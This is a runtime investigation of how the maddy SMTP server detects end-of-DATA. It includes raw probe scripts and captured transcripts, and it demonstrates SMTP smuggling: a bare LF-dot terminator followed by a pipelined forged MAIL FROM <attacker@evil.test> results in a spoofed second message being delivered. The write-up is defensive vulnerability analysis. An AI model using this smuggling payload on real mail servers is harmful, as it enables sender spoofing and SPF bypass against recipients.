# maddy — How the SMTP server detects the end of the DATA phase under adversarial line-ending framing

**Repository:** `github.com/foxcpp/maddy`
**Commit:** `26452dd8dd787dc455278b0fdd296f4a5432c768`
**Source branch:** `maddy_26452dd8dd78`
**Document type:** investigative, runtime-observed Q&A (read-only analysis — no production code changed)

---

## Scope note

This document answers, with **observed runtime evidence**, how maddy's inbound SMTP server decides that a message body is finished — the instant it stops reading DATA and returns to command parsing — when a client frames the end-of-DATA boundary in conformant and adversarial ways (bare `LF`, bare `CR`, `LF.CRLF`, dot-stuffing, over-length lines, and pipelined SMTP smuggling), and how the story changes behind a small framing-normalizing / framing-blocking front proxy.

Everything below was produced by **building and running maddy at this exact commit** and driving it with a **raw, byte-exact TCP client** (never a normalizing SMTP library), then quoting the captured output verbatim. Each claim carries a `file:line` citation into the source or a reference to the observed output that produced it.

**The central finding (proven end-to-end below):** the end-of-DATA decision is **not implemented in maddy**. maddy hands the DATA reader from `github.com/emersion/go-smtp` (`r: c.text.DotReader()` at go-smtp `data.go:53`) straight to Go's standard-library `net/textproto` dot reader (`func (r *Reader) DotReader()` at `/usr/local/go/src/net/textproto/reader.go:299`). That state machine — not maddy — decides what terminates DATA. As a direct consequence, maddy accepts a **bare `<LF>.<LF>`** as a valid end-of-DATA (delivering a body **byte-identical** to the conformant `<CR><LF>.<CR><LF>` case), which is precisely the SMTP-smuggling condition (CVE-2023-51764 family). **Remediation is explicitly out of scope**; this is analysis only, scoped to this commit and its pinned dependency versions.

**Read-only caveat:** the only repository artifact created is this document. All scripts, configs and runtime directories used to gather evidence lived under `/tmp/maddy_investigation/` (outside the repository) and were deleted afterward; the final `git status --porcelain` shows only this file.

---

## 1. Setup (reproducible)

### 1.1 Toolchain and build

The project pins Go 1.13.4 (`GOVERSION=1.13.4` at `get.sh:10`, `REQUIRED_GOVERSION=1.13.0` at `get.sh:3`, `go 1.13` at `go.mod:3`) and needs a C compiler for the CGO SQLite driver `github.com/mattn/go-sqlite3 v1.11.0` (`go.mod:26`).

```console
$ go version
go version go1.13.4 linux/amd64

$ go build -o /tmp/maddy_investigation/maddy_bin ./cmd/maddy
$ ls -l /tmp/maddy_investigation/maddy_bin | awk '{print $5}'
21846744
```

The build is the first module fetch; it resolves `github.com/emersion/go-smtp v0.12.1-0.20191206174923-1f576e0ec85c` (`go.mod:19`) into the module cache. All go-smtp `file:line` citations in this document were re-verified against the fetched source at:

```
/root/go/pkg/mod/github.com/emersion/go-smtp@v0.12.1-0.20191206174923-1f576e0ec85c
```

No dependency was added, upgraded, removed, or re-imported; `go.mod`/`go.sum` were used as-is.

### 1.2 Minimal out-of-repository `maddy.conf`

A minimal config was written under `/tmp` (not in the repo). It opens exactly one **plaintext inbound** `smtp` listener (pattern from `maddy.conf:53`), omits every default check (the stock `maddy.conf` smtp block at lines 54–70 has `require_matching_ehlo`, `require_mx_record`, `verify_dkim`, `apply_spf`, `dmarc yes`, which would reject a localhost raw-client probe before DATA is reached), and routes `deliver_to` a `queue` target whose on-disk `<id>.body` file is the delivered, dot-unstuffed body (`storeNewMessage` writes `<id>.body` via `io.Copy(bodyFile, bodyReader)` at `internal/target/queue/queue.go:713,719`). The queue's onward `smtp_downstream` target points at a tiny local capture server that returns a temporary `451`, so the queue **defers** and the `<id>.body` file **persists** for inspection.

```
state /tmp/maddy_investigation/state
runtime /tmp/maddy_investigation/runtime
hostname test.local
tls off
smtp tcp://127.0.0.1:2525 {
    io_debug
    debug
    deliver_to queue {
        location /tmp/maddy_investigation/queue_dbg
        hostname test.local
        max_tries 8
        target smtp_downstream {
            targets tcp://127.0.0.1:19999
        }
    }
}
```

Launch (maddy logs to stderr by default — `internal/log/log.go:202`; the `-debug` flag is `flag.BoolVar(&log.DefaultLogger.Debug, "debug", ...)` at `maddy.go:104`):

```console
$ /tmp/maddy_investigation/maddy_bin -debug -config /tmp/maddy_investigation/maddy.conf
smtp: I/O debugging is on! It may leak passwords in logs, be careful!
smtp: listening on tcp://127.0.0.1:2525
smtp: 220 test.local ESMTP Service Ready
```

### 1.3 A key, non-obvious finding: the wire transcript is gated by **both** `io_debug` **and** `debug`

The go-smtp wire-transcript tee is wired only when the **`io_debug`** directive is set:

```go
// internal/endpoint/smtp/smtp.go
565:	cfg.Bool("io_debug", false, false, &ioDebug)
566:	cfg.Bool("debug", true, false, &endp.Log.Debug)
...
603:	if ioDebug {
604:		endp.serv.Debug = endp.Log.DebugWriter()
605:		endp.Log.Println("I/O debugging is on! It may leak passwords in logs, be careful!")
```

…and the writer it installs is a **no-op unless the logger's `Debug` flag is true** (which `-debug`/`debug` sets):

```go
// internal/log/log.go
173:	if !l.Debug {
174:		return ioutil.Discard
```

So the protocol transcript surfaces **only when `io_debug` wires the tee AND `debug` (or the `-debug` CLI flag) makes `DebugWriter()` non-discarding.** This was verified empirically. With a `debug`-only config (no `io_debug`), the same conformant message produced structured logs but **zero wire bytes**:

```console
$ grep -c "This is the body" run_debugonly.log      # body bytes on the wire
0
$ grep -c "^smtp: 354" run_debugonly.log            # the 354 prompt on the wire
0
$ grep -c "smtp: incoming message\|accepted" run_debugonly.log   # structured markers present
3
```

Adding `io_debug` (with `debug`) makes the wire transcript appear:

```console
$ grep -c "This is the body" run_crlf2.log
1
$ grep -c "^smtp: 354" run_crlf2.log
1
```

The `debug` directive has `inheritGlobal=true` (`smtp.go:566`) so it inherits the process-wide `-debug`; `io_debug` has `inheritGlobal=false` (`smtp.go:565`) so it must be set explicitly inside the `smtp {}` block. On startup with `io_debug`, maddy prints the exact warning `smtp: I/O debugging is on! It may leak passwords in logs, be careful!` (`smtp.go:605`).

### 1.4 The raw byte-exact probe client (why a library will not do)

The go-smtp **client** and `internal/testutils` (`internal/endpoint/smtp/smtp_test.go`, `internal/testutils/smtp_server.go`) normalize line endings, which would **mask the very framing under study**. All probes therefore used a raw `socket` client that writes exact bytes. Its framing matrix (`scripts/probe.py`):

```python
BODY = b"Subject: Framing test\r\n\r\nThis is the body.\r\n"
SCENARIOS = {
    "crlf":     BODY + b".\r\n",                                              # conformant control
    "lflf":     BODY + b".\n",                                               # bare-LF dot line
    "crcr":     BODY + b".\r",                                               # bare-CR (no LF) -> should NOT terminate
    "lfcrlf":   b"Subject: Framing test\r\n\r\nThis is the body.\n" + b".\r\n",
    "dotstuff": b"Subject: Dot test\r\n\r\n..hidden leading dot\r\nnormal line\r\n" + b".\r\n",
    "longline": b"Subject: Long\r\n\r\n" + (b"A" * 2100) + b"\r\n" + b".\r\n",
    "purelf":   b"Subject: Framing test\n\nThis is the body.\n.\n",          # no CR anywhere
}
```

A companion `scripts/capture_server.py` acts as the queue's downstream target: in **defer** mode it answers `RCPT` with `451 4.3.0` so maddy's queue classifies the failure as **temporary** and **retains** the `<id>.body` file for inspection. (Empirically necessary: when the onward relay is simply unreachable, the queue treats `connection refused` as **permanent** and removes the body from disk.)

The O5 front proxy (`scripts/proxy.py`) sits between client and maddy. maddy has **no native PROXY-protocol / framing-normalization support** — a repo-wide search for `proxy_protocol`/`proxyproto` returns **zero** matches — so the proxy is a throwaway external tool with two modes:

```python
# mode "clean": normalize every lone CR and lone LF to CRLF
elif byte == 0x0a:            # LF
    out += b"\r\n"            # covers CRLF and lone LF
# mode "block": reject a connection that carries a bare newline
if scan_bare(data, state):
    csock.sendall(b"521 5.5.2 bare newline rejected (proxy block mode)\r\n")
    break
```

---

## O1 — The boundary moment: what you see at the instant DATA ends

**Command.** Conformant control payload (`...This is the body.<CR><LF>.<CR><LF>`), full transcript captured with `io_debug`+`debug`:

```console
$ python3 scripts/probe.py crlf 2525
```

**Surface 1 — the SMTP exchange (verbatim wire transcript, `smtp:`-prefixed = server I/O).** The `354` continuation, the body being consumed, and the return to command parsing:

```
smtp: DATA
smtp: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>

smtp: Subject: Framing test

This is the body.
.

[debug] smtp/pipeline: delivery.Body ok, Delivery object = *msgpipeline.delivery	{"msg_id":"5f325257"}
smtp: accepted	{"msg_id":"5f325257"}
smtp: 250 2.0.0 OK: queued

[debug] smtp: reset
```

**Surface 2 — the structured log markers** (msg_id assigned at RCPT, then `accepted`):

```
smtp: incoming message	{"msg_id":"5f325257","sender":"sender@test.local","src_host":"test.probe","src_ip":"127.0.0.1:50058"}
smtp: RCPT ok	{"msg_id":"5f325257","rcpt":"rcpt@test.local"}
smtp: accepted	{"msg_id":"5f325257"}
```

**Surface 3 — the delivered body on disk** (`<id>.body`, 18 bytes):

```console
$ od -c queue_dbg/5f325257.body    # (id varies per run; here the crlf control)
0000000   T   h   i   s       i   s       t   h   e       b   o   d   y
0000020   .  \n
0000022
$ wc -c queue_dbg/*.body
18
```

**What is observed at the boundary.** The exact literals:

- the DATA go-ahead prompt is `354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>` — matching go-smtp `conn.go:510` `c.WriteResponse(354, EnhancedCode{2, 0, 0}, "Go ahead. End your data with <CR><LF>.<CR><LF>")`;
- the post-DATA status line is `250 2.0.0 OK: queued`;
- the debug marker `[debug] smtp: reset` (emitted from maddy's `Reset()` handler at `smtp.go:64`) is the observable instant the connection returns to command parsing — it appears **after** `accepted` and the `250`.

**Reasoning (mechanism, tied to code).** go-smtp's `handleData` (go-smtp `conn.go`) does, in order: write the `354` (`conn.go:510`), `defer c.reset()` (`conn.go:512`), build the DATA reader `r := newDataReader(c)` (`conn.go:519`), call the backend `c.Session().Data(r)` (`conn.go:520`), and then **`io.Copy(ioutil.Discard, r)`** (`conn.go:521`, commented `// Make sure all the data has been consumed`) to drain any bytes the backend did not read up to the boundary, before the deferred `reset()` fires and the command loop resumes. On maddy's side, `func (s *Session) Data(r io.Reader) error` (`smtp.go:312`) reads the header with `textproto.ReadHeader(bufr)` (`smtp.go:285`, inside `prepareBody` at `smtp.go:283`), buffers the body with `buffer.BufferInMemory(bufr)` (`smtp.go:298`), delivers via `s.delivery.Body(...)` / `s.delivery.Commit(...)` (`smtp.go:326,330`), and logs `s.log.Msg("accepted", "msg_id", s.msgMeta.ID)` (`smtp.go:334`). The `354` prompt advertises the conformant terminator `<CR><LF>.<CR><LF>`, but what the reader actually treats as the terminator is decided one layer down (see O2/O3). Note the server also advertises `250 SIZE 33554432` in the EHLO reply — `33554432 = 32*1024*1024`, the `max_message_size` default (`smtp.go:561`).

---

## O2 — Identical-except-for-framing payloads: how the three surfaces diverge (or don't)

The body content is fixed (`This is the body.`); only the DATA-boundary framing differs. Each variant was delivered and its `<id>.body` captured with `od -c`, a byte count, and a SHA-256.

**Command (byte-identity proof across four accepting framings):**

```console
$ for s in crlf lflf lfcrlf purelf; do
    <restart maddy fresh; clean queue>
    python3 scripts/probe.py "$s" 2525
    bf=$(ls queue_dbg/*.body | head -1)
    printf "%-8s | bytes=%s | sha256=%s\n" "$s" "$(wc -c < "$bf")" "$(sha256sum "$bf" | cut -d' ' -f1)"
  done
```

**Observed — all four are byte-identical (same 18 bytes, same SHA-256):**

```
crlf     | bytes=18 | sha256=5416a9e2ef754dd0d354b8e474df6cf24a71e3072cef39635e6b9197e2b8b438
lflf     | bytes=18 | sha256=5416a9e2ef754dd0d354b8e474df6cf24a71e3072cef39635e6b9197e2b8b438
lfcrlf   | bytes=18 | sha256=5416a9e2ef754dd0d354b8e474df6cf24a71e3072cef39635e6b9197e2b8b438
purelf   | bytes=18 | sha256=5416a9e2ef754dd0d354b8e474df6cf24a71e3072cef39635e6b9197e2b8b438
```

Each of these also returned `250 2.0.0 OK: queued` on the wire and logged `accepted`. Concretely:
`crlf` → `msg_id=5f325257`; `lflf` → `msg_id=b6d5bde3`; `lfcrlf` → `msg_id=83da1476`; `purelf` → `msg_id=8a318d62` — same three-surface outcome, differing only in the msg_id value.

**This is the crux of O2:** a payload terminated with a **bare `<LF>.<LF>`** (`lflf`), or with a bare-LF last content line (`lfcrlf`), or with **no `<CR>` anywhere** (`purelf`), produces a delivered body **indistinguishable at the byte level** from the conformant `<CR><LF>.<CR><LF>` control. The delivered body ends in a bare `\n` in every case (the `\r` was rewritten away — see reasoning).

### Dot-stuffing (`..text` → `.text`)

**Command:** `python3 scripts/probe.py dotstuff 2525` — the payload sends a line `..hidden leading dot` and a normal line.

**Observed delivered body (32 bytes):**

```console
$ od -c queue_dbg/<id>.body
0000000   .   h   i   d   d   e   n       l   e   a   d   i   n   g
0000020   d   o   t  \n   n   o   r   m   a   l       l   i   n   e  \n
0000040
$ wc -c   # 32
```

The leading `..` was **unstuffed to a single `.`** and each `\r\n` was rewritten to `\n`. Delivered: `.hidden leading dot\nnormal line\n`. (Wire response: `250 2.0.0 OK: queued`, `msg_id=89d09c82`.)

### Over-length line (`MaxLineLength` default `2000`)

maddy does not override go-smtp's `MaxLineLength` (default `2000` at go-smtp `server.go:76`; field declared `server.go:40`). A single content line longer than the limit is rejected.

**Command:** a focused probe that flushes one over-limit line by itself (no trailing command), `N` = content-byte count of the long line:

```console
$ python3 scripts/probe_longline.py 2100
```

**Observed:**

```
smtp: DATA error	{"msg_id":"7c803e62","reason":"smtp: too longer line in input stream"}
smtp: 554 5.0.0 Internal server error (msg ID = 7c803e62)
```

The reason literal is exactly `smtp: too longer line in input stream` — go-smtp `lengthlimit_reader.go:8` `var ErrTooLongLine = errors.New("smtp: too longer line in input stream")`.

**Threshold, pinned by experiment** (`probe_longline.py` for `N` = 1998, 1999, 2000, 2001):

```
N=1998 -> smtp: 250 2.0.0 OK: queued
N=1999 -> smtp: 250 2.0.0 OK: queued
N=2000 -> smtp: DATA error {"reason":"smtp: too longer line in input stream"} -> 554
N=2001 -> smtp: DATA error {"reason":"smtp: too longer line in input stream"} -> 554
```

**Reasoning.** The limiter counts the line-terminating characters too: `func (r lineLimitReader) Read(b []byte)` (go-smtp `lengthlimit_reader.go:21`) increments `curLineLength` per byte and returns `ErrTooLongLine` once it **exceeds** `LineLimit`, resetting only on `'\n'`. With `LineLimit=2000`, 1999 content bytes + `\r` reaches 2000 (accepted) while 2000 content bytes + `\r` reaches 2001 (rejected) — matching the observed 1999/2000 boundary. Note this `Read` has a **value receiver**, so `curLineLength` does not persist across separate underlying `Read` calls; the limit trips within a single read of the long line.

### Message size limit (`max_message_size` default 32 MiB)

**Command:** stream many `1000×'A'` lines past 32 MiB (`scripts/probe_size.py`):

```console
$ python3 scripts/probe_size.py     # streamed ~35.65 MB before the server cut it off
```

**Observed:**

```
smtp: DATA error	{"msg_id":"ebd44ebd","reason":"Maximum message size exceeded"}
smtp: 552 5.3.4 Maximum message size exceeded (msg ID = ebd44ebd)
smtp: aborted	{"msg_id":"ebd44ebd"}
```

The status is exactly `552 5.3.4 Maximum message size exceeded` — go-smtp `data.go:38-41` `var ErrDataTooLarge = &SMTPError{ Code: 552, EnhancedCode: EnhancedCode{5, 3, 4}, Message: "Maximum message size exceeded" }`, returned from the data reader at `data.go:67`. The `250 SIZE 33554432` advertised in EHLO equals the 32 MiB default (`smtp.go:561` `cfg.DataSize("max_message_size", false, false, 32*1024*1024, ...)`).

---

## O3 — Pipelined pressure / SMTP smuggling: bytes a stricter peer would keep in the body

**Command.** One connection. Message #1's DATA is terminated with a **bare `<LF>.<LF>`**; immediately after (same `sendall`, pipelined) comes a second `MAIL FROM` / `RCPT TO` / `DATA` sequence with a **forged** sender:

```console
$ python3 scripts/probe_smuggle.py 2525
```

The 168-byte blast sent on the wire (verbatim `repr`, note `\n.\n` mid-stream then trailing commands):

```
=== blast bytes (168) ===
b'Subject: First message\r\n\r\nLegitimate body line\n.\nMAIL FROM:<attacker@evil.test>\r\nRCPT TO:<victim@test.local>\r\nDATA\r\nSubject: SMUGGLED SPOOF\r\n\r\nSpoofed body content\r\n.\r\n'
```

**Surface 1 — the client received FIVE responses after the single blast** (i.e. the trailing bytes were parsed as new commands):

```
b"250 2.0.0 OK: queued\r\n250 2.0.0 Roger, accepting mail from <attacker@evil.test>\r\n250 2.0.0 I'll make sure <victim@test.local> gets this\r\n354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n250 2.0.0 OK: queued\r\n"
```

**Surface 2 — TWO `incoming message` events on the SAME connection** (identical `src_ip 127.0.0.1:59076`), the second with the forged sender:

```
smtp: incoming message	{"msg_id":"21381b0d","sender":"sender@test.local","src_host":"test.probe","src_ip":"127.0.0.1:59076"}
smtp: incoming message	{"msg_id":"faeb2971","sender":"attacker@evil.test","src_host":"test.probe","src_ip":"127.0.0.1:59076"}
```

**Surface 3 — TWO delivered bodies, with distinct envelopes** (captured from a fresh run; `.meta` shows the `From`):

```console
$ for m in queue_dbg/*.meta; do ...print From, ID...; done
2ebd29c7.meta:  From= sender@test.local   ID= 2ebd29c7
ee971f3d.meta:  From= attacker@evil.test  ID= ee971f3d

$ od -c queue_dbg/2ebd29c7.body      # message #1 (legitimate)
0000000   L   e   g   i   t   i   m   a   t   e       b   o   d   y
0000020   l   i   n   e  \n
0000025                                # 21 bytes

$ od -c queue_dbg/ee971f3d.body      # message #2 (SMUGGLED / spoofed)
0000000   S   p   o   o   f   e   d       b   o   d   y       c   o   n
0000020   t   e   n   t  \n
0000025                                # 21 bytes
```

**What this proves.** A single connection carrying one pipelined blast produced **two accepted messages**: the legitimate `From=sender@test.local` (`msg_id=21381b0d`) and a **smuggled** `From=attacker@evil.test`, `To=victim@test.local` (`msg_id=faeb2971`). The bytes after the bare-LF dot — which an RFC-5321-strict, `<CR><LF>.<CR><LF>`-only peer would have kept **inside the first message's body** — were instead parsed by maddy as fresh SMTP commands.

**Reasoning (mechanism, tied to code).** maddy's DATA reader is delegated: go-smtp builds it as `r: c.text.DotReader()` (go-smtp `data.go:53`), i.e. Go's `net/textproto` dot reader (`/usr/local/go/src/net/textproto/reader.go:299`). That state machine (`func (d *dotReader) Read` at `reader.go:311`, commented `elide leading dots, rewrite trailing \r\n into \n, and detect ending .\r\n line` at `reader.go:313`) transitions on a lone `'\n'` at the start of a line: from `stateDot` on `'\n'` it goes to `stateEOF` (`reader.go:351`) — i.e. a bare `<LF>.<LF>` is accepted as end-of-DATA exactly like `<CR><LF>.<CR><LF>` (`stateDotCR` + `'\n'` → `stateEOF` at `reader.go:358`). When `Data()` returns, go-smtp's `defer c.reset()` (`conn.go:512`) restores the command loop, and the still-buffered trailing bytes are read as the next command — the smuggling surface. This is the SMTP-smuggling class (CVE-2023-51764 and the related Sendmail/Exim CVE-2023-51765/51766): a parsing differential where a receiver accepts bare-`<LF>` end-of-data that RFC 5321 §4.5.2 does not sanction, enabling a spoofed `MAIL FROM` that bypasses SPF alignment. **This is analysis only — no fix is prescribed.**

---

## O4 — Back-to-back stability, and the failure mode when framing never terminates

### O4(a) — Several well-formed messages on one connection

**Command:** four conformant messages back-to-back on a single connection, with client-side per-message timing (`scripts/probe_backtoback.py`):

```console
$ python3 scripts/probe_backtoback.py 2525
msg #1: resp=b'250 2.0.0 OK: queued'  elapsed=3249.5 ms
msg #2: resp=b'250 2.0.0 OK: queued'  elapsed=3229.5 ms
msg #3: resp=b'250 2.0.0 OK: queued'  elapsed=3209.0 ms
msg #4: resp=b'250 2.0.0 OK: queued'  elapsed=3208.5 ms
```

**Server side — four distinct, ordered msg_ids and four correct distinct bodies:**

```
msg_id":"18bd7352"   -> body "Body of message number 1"  (25 bytes)
msg_id":"db5554a0"   -> body "Body of message number 2"  (25 bytes)
msg_id":"d65d02ad"   -> body "Body of message number 3"  (25 bytes)
msg_id":"508f5eaa"   -> body "Body of message number 4"  (25 bytes)
```

**Observation.** The boundary decision does **not** wobble across back-to-back messages: each message got its own `250 2.0.0 OK: queued`, a fresh ordered `msg_id`, and its own correct 25-byte body. The client-side per-message elapsed times are tight (3249.5 → 3208.5 ms, a spread of ~41 ms). Those ~3.2 s are the **client's** drain idle windows (the probe waits for socket idle after each message), **not** server processing latency — they are quoted to show consistency, not to measure server speed.

**Reasoning.** Each message body is **fully buffered in memory** before pipeline hand-off: `buffer.BufferInMemory(bufr)` (`internal/buffer/memory.go:27`, called at `smtp.go:298`) reads the whole body into memory, after which `s.endp.pipeline.Start(...)` (`smtp.go:148`) hands it to `internal/msgpipeline`. Each message's id is generated independently (8 hex chars, `internal/msgpipeline/msgid.go:12-16`), so ids stay distinct and ordered. Between messages, go-smtp's `defer c.reset()` (`conn.go:512`) plus maddy's `[debug] smtp: reset` (`smtp.go:64`) cleanly re-arm the command loop.

### O4(b) — Non-terminating framing: bare `<CR>.<CR>` hangs until the read timeout

A bare `<CR>` is **not** a line terminator, so `.\r` (no `<LF>`) is never recognized as end-of-DATA; the reader keeps waiting. To observe this quickly, `read_timeout 5s` was set in a variant config (the default is 10 minutes — `smtp.go:560` `cfg.Duration("read_timeout", false, false, 10*time.Minute, ...)`).

**Command:** send `...This is the body.\r\n.\r`, then hold the connection open, sending nothing further (`scripts/probe_hang.py`):

```console
$ python3 scripts/probe_hang.py
DATA resp: b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
sent bare-CR dot line; now waiting (sending nothing, not closing)...
after wait: elapsed=6.00s closed_by_server=True data=b'451 4.0.0 Internal server error (msg ID = 1d410abe)\r\n221 2.4.2 Idle timeout, bye bye\r\n'
```

**Server side:**

```
smtp: DATA error	{"msg_id":"1d410abe","reason":"read tcp 127.0.0.1:2525->127.0.0.1:52506: i/o timeout"}
smtp: 451 4.0.0 Internal server error (msg ID = 1d410abe)
smtp: aborted	{"msg_id":"1d410abe"}
[debug] smtp: reset
smtp: 221 2.4.2 Idle timeout, bye bye
```

**Observation & reasoning.** With no valid boundary, the server blocked in the DATA read for the full `read_timeout` (here 5 s; client measured `elapsed=6.00s` end-to-end) and then failed the read with `i/o timeout`, returning `451 4.0.0 Internal server error` and disconnecting with `221 2.4.2 Idle timeout, bye bye`. maddy logs `DATA error` (`smtp.go:317`) and `aborted` (`smtp.go:72`). The bare `<CR>` never reaches the dot state at begin-of-line because the `net/textproto` machine only enters `stateBeginLine` after a real `'\n'` (`stateCR` advances to `stateBeginLine` only on `'\n'` — `reader.go:367`), so the `.` after a lone `<CR>` is treated as ordinary body data, not a terminator.

A closely related variant: when the probe sends the bare-CR dot line and then **closes** the socket (rather than holding it open), the read ends in `unexpected EOF` instead of a timeout — e.g. `smtp: DATA error {"reason":"unexpected EOF"}` → `554 5.0.0 Internal server error` → `aborted`. Either way, the bare-CR framing never produces a delivered body.

---

## O5 — Front proxy: how "clean" vs "block" changes the story

The same smuggling blast (O3) was run three ways: **direct** to maddy (baseline), through the **clean** proxy (rewrites bare `CR`/`LF` → `CRLF`), and through the **block** proxy (rejects a connection carrying a bare newline). Delivered-message count is the decisive surface.

**Commands:**

```console
# baseline
$ python3 scripts/probe_smuggle.py 2525
# clean proxy in front (client -> 2526 -> maddy 2525)
$ python3 scripts/proxy.py clean 2526 2525 &
$ python3 scripts/probe_smuggle.py 2526
# block proxy in front
$ python3 scripts/proxy.py block 2526 2525 &
$ python3 scripts/probe_smuggle.py 2526
```

**Observed delivered-message counts:**

```
DIRECT delivered: 2   ("From":"sender@test.local"  +  "From":"attacker@evil.test")
CLEAN  delivered: 2   ("From":"sender@test.local"  +  "From":"attacker@evil.test")
BLOCK  delivered: 0
```

**DIRECT** and **CLEAN** — the client received the identical five-response sequence (two `250 2.0.0 OK: queued`, i.e. two messages):

```
b"250 2.0.0 OK: queued\r\n250 2.0.0 Roger, accepting mail from <attacker@evil.test>\r\n250 2.0.0 I'll make sure <victim@test.local> gets this\r\n354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n250 2.0.0 OK: queued\r\n"
```

**BLOCK** — the client received the proxy's synthetic rejection followed by maddy aborting the truncated message:

```
b'521 5.5.2 bare newline rejected (proxy block mode)\r\n554 5.0.0 Internal server error (msg ID = 8c6f490c)\r\n'
```

…and on maddy's side (the proxy dropped the connection mid-DATA, so maddy hit EOF):

```
smtp: incoming message	{"msg_id":"8c6f490c","sender":"sender@test.local","src_host":"test.probe","src_ip":"127.0.0.1:34742"}
smtp: DATA error	{"msg_id":"8c6f490c","reason":"unexpected EOF"}
smtp: 554 5.0.0 Internal server error (msg ID = 8c6f490c)
smtp: aborted	{"msg_id":"8c6f490c"}
```

**Reasoning — the important nuance.** The **block** proxy is the only mode that prevents the smuggle: it detects the bare newline before maddy sees the body, returns `521 5.5.2 bare newline rejected (proxy block mode)`, and drops the connection, so **zero** messages are delivered. The **clean** proxy does **not** help — and is arguably worse: by rewriting the client's ambiguous `\n.\n` into a conformant `\r\n.\r\n`, it hands maddy an **explicit, unambiguous** end-of-DATA, so the second (spoofed) message is still delivered. This is exactly the documented SMTP-smuggling nuance: a gateway that *normalizes* bare newlines can *manufacture* a clean boundary that even a strict backend would honor, which is why the Postfix mitigation for CVE-2023-51764 offers an explicit *reject* option (`smtpd_forbid_bare_newline=yes`, replying "bare <LF> received" and disconnecting) rather than relying on normalization alone. maddy itself has no such control (no `proxy_protocol`/`proxyproto`; no bare-newline directive) — the proxy is entirely external. **Analysis only; no remediation prescribed.**

---

## O6 — Negative space: what lingers on failure, and what you expect but never see

**What lingers on disk after a failed message: nothing.** After a failed `crcr` transaction (bare-CR, non-terminating), the queue directory is empty — no partial `<id>.body`, `<id>.header`, or `<id>.meta`:

```console
$ python3 scripts/probe.py crcr 2525      # (with read_timeout 5s) -> DATA error, aborted
$ ls queue_dbg/ | wc -l
0
```

The corresponding server log shows the abort with no persistence:

```
smtp: DATA error	{"msg_id":"c6cd225e","reason":"unexpected EOF"}
smtp: 554 5.0.0 Internal server error (msg ID = c6cd225e)
smtp: aborted	{"msg_id":"c6cd225e"}
```

**What lingers in memory: nothing observable.** The body is buffered in memory (`buffer.BufferInMemory`, `smtp.go:298`); on a failed/short read it is never committed, and go-smtp drains any unread bytes with `io.Copy(ioutil.Discard, r)` (`conn.go:521`) and resets via `defer c.reset()` (`conn.go:512`). The observable end-of-transaction signal is the `[debug] smtp: reset` line (`smtp.go:64`), which marks the return to command parsing on both success and failure.

**What you expect but never see: any "bare `<LF>` rejected" signal.** A search across every maddy log for a conformance/bare-newline rejection returns **zero** hits:

```console
$ grep -rIi "bare|conforman|rfc|not.*conform" wire_crlf.log wire_lflf.log wire_lfcrlf.log wire_purelf.log ... | wc -l
0
```

There is no code path in maddy or go-smtp that flags a bare `<LF>.<LF>` end-of-DATA — it is accepted **silently**. As direct corroboration, the structured log markers for the bare-LF (`lflf`) message are **identical** to the conformant (`crlf`) message, differing only in the msg_id value:

```
crlf markers:   1x "incoming message"  1x "RCPT ok"  1x "250 2.0.0 OK: queued"  1x "smtp: reset"
lflf markers:   1x "incoming message"  1x "RCPT ok"  1x "250 2.0.0 OK: queued"  1x "smtp: reset"
```

**Reasoning.** Because the boundary decision is delegated to `net/textproto` (which accepts bare `<LF>.<LF>` — `reader.go:351`), neither maddy nor go-smtp ever *knows* the framing was non-conformant; there is nothing to log. The only failure-time output an operator sees is the generic `DATA error` / `aborted` pair (for reads that never terminate or are cut short) — never a framing-specific diagnostic. This absence is itself the security-relevant observation: the leniency is invisible in the logs.

**Explicitly labeled as not-runtime-verified:** the exact bytes that `net/textproto` retains vs. emits are grounded in the source state machine (`reader.go:311-379`) and in the delivered-body captures above (bare `\n` endings, dot-unstuffing, byte-identical bodies); the internal `stateEOF`/`stateData` transitions themselves are not directly observable at the wire and are cited from source rather than asserted from a runtime probe of the reader internals.

---

## Summary — the central finding

At commit `26452dd8dd787dc455278b0fdd296f4a5432c768`, maddy does **not** implement the end-of-DATA decision. Its SMTP endpoint delegates the DATA body to `github.com/emersion/go-smtp` (`func (s *Session) Data(r io.Reader)` at `smtp.go:312`), which constructs the reader as `r: c.text.DotReader()` (go-smtp `data.go:53`) — Go's standard-library `net/textproto` dot reader (`reader.go:299`). That state machine decides what terminates DATA, and it is lenient by RFC-5321 standards:

- **(a) bare `<LF>.<LF>` is a valid end-of-DATA.** Bodies delivered from `crlf`, `lflf`, `lfcrlf`, and `purelf` framings are **byte-identical** — 18 bytes, SHA-256 `5416a9e2ef754dd0d354b8e474df6cf24a71e3072cef39635e6b9197e2b8b438` — and the trailing bytes after a bare-LF dot are parsed as new commands, delivering a **second, spoofed** message on one connection (`From=attacker@evil.test`, `msg_id=faeb2971`).
- **(b) bare `<CR>.<CR>` is NOT a boundary.** Those bytes stay in the body and the reader blocks until `read_timeout` (`i/o timeout` → `451 4.0.0`), or ends in `unexpected EOF` if the client closes; nothing is delivered and nothing lingers on disk.
- **(c) dot-unstuffing is applied.** A leading `..` is delivered as a single `.` (`.hidden leading dot\nnormal line\n`, 32 bytes), and `\r\n` line endings are rewritten to `\n` in the delivered body.

This leniency is exactly the **SMTP-smuggling** condition (CVE-2023-51764 for Postfix, with sibling CVE-2023-51765/51766 for Sendmail/Exim): RFC 5321 §4.5.2 defines `<CR><LF>.<CR><LF>` as the end-of-mail indicator, and accepting a bare-`<LF>` equivalent creates a parsing differential that lets an attacker inject a spoofed `MAIL FROM` and bypass SPF alignment. An external **block**-mode proxy prevents it (0 delivered); a **clean**-mode proxy does not (it normalizes the ambiguous boundary into a conformant one and the spoof still lands). **This document is analysis only — no remediation is proposed — and every conclusion is scoped to this exact commit and its pinned dependency versions.**

---

## Coverage-pass checklist

| Sub-question | Answered with observed evidence | Key literals (with citation) |
|---|---|---|
| **O1** — the boundary moment | ✅ full transcript: `354` prompt, body consumed, `250 2.0.0 OK: queued`, `[debug] smtp: reset` | `354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>` (conn.go:510); `accepted` (smtp.go:334); reset (smtp.go:64) |
